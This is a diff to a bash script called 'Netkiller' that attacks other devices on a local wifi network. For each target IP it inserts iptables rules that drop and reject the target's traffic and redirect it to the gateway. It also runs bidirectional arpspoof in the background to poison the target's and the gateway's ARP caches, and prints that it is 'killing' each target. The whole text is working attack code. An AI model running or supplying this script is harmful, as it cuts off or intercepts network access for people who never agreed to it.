@@ -139,18 +139,21 @@ for TARGET in $TARGET_IPS; do
         continue
     fi
 
-    # Block all traffic of the target wifi clients
-    iptables -I FORWARD ! -s "$TARGET" -d "$GATEWAY" -j DROP
-    iptables -I FORWARD -s "$GATEWAY" ! -d "$TARGET" -j DROP
-    iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
-    (
+        # Block all traffic of the target wifi clients
+        sudo iptables -I FORWARD -s "$TARGET" -j DROP
+        sudo iptables -I FORWARD -d "$TARGET" -j DROP
+        sudo iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
+        sudo iptables -I FORWARD -s "$TARGET" -p tcp -j REJECT --reject-with tcp-reset
+        sudo iptables -I FORWARD -s "$TARGET" -p udp -j REJECT --reject-with icmp-port-unreachable
+     (
         # Bidirectional ARP Spoofing
-        arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
-        arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
-    ) &
+       sudo arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
+       sudo arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
+     ) &
+      echo "Netkiller killing the target IP: $TARGET"
 done
 
-echo "Netkiller Attack is running in the background...!!!"
 echo ""
+echo "Netkiller Attack is running in the background...!!!"
 echo "To stop, run: sudo netkiller-stop"
 echo " "
